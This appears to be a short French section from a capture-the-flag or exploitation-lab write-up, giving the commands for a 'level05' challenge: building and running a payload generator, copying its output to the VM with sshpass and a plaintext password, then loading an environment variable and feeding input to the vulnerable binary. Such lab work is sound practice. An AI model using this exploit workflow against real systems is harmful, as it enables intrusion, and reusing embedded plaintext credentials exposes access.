### Commandes

Depuis l'hôte :

```bash
make && ./generator && sshpass -p '3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN' scp -P 4242 -r args level05@localhost:/tmp/
```

Sur la vm :

```bash
export SCRIPT="$(cat /tmp/args/env_var)"
./level05 < /tmp/args/arg
```
